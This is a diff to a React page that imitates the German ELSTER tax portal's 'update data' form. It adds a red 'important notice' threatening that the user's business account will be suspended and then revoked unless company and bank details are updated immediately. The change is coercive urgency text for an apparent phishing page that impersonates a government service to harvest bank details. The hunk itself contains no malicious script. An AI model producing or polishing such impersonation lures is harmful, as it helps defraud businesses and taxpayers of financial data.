@@ -181,7 +181,14 @@ const ElsterDatenaktualisierung = () => {
         </aside>
 
         <section>
-          <h1 style={{ fontSize: 28, fontWeight: 400, color: TEXT, margin: "4px 0 20px" }}>Daten aktualisieren</h1>
+          <h1 style={{ fontSize: 28, fontWeight: 400, color: TEXT, margin: "4px 0 12px" }}>Daten aktualisieren</h1>
+          <p style={{ fontSize: 15, lineHeight: 1.55, color: TEXT, margin: "0 0 20px", maxWidth: 820 }}>
+            <strong style={{ color: "#c00" }}>Wichtiger Hinweis:</strong> Zur Aufrechterhaltung Ihres ELSTER-Unternehmenskontos ist eine
+            unverzügliche Aktualisierung Ihrer Firmen- und Bankdaten zwingend erforderlich. Bitte vervollständigen Sie die
+            nachfolgenden Angaben umgehend. Andernfalls wird Ihr Zugang zu Mein ELSTER vorübergehend gesperrt und kann
+            bei weiterer Nichtbeachtung dauerhaft entzogen werden, wodurch die elektronische Übermittlung von
+            Steuererklärungen, Umsatzsteuer-Voranmeldungen und sonstigen Meldungen an Ihr Finanzamt nicht mehr möglich ist.
+          </p>
 
           <div style={{ display: "grid", gridTemplateColumns: "1fr 300px", columnGap: 0, paddingRight: 16 }} className="elster-content">
             <div style={{ background: "#fff", padding: "20px 24px", border: `1px solid ${BORDER}` }}>
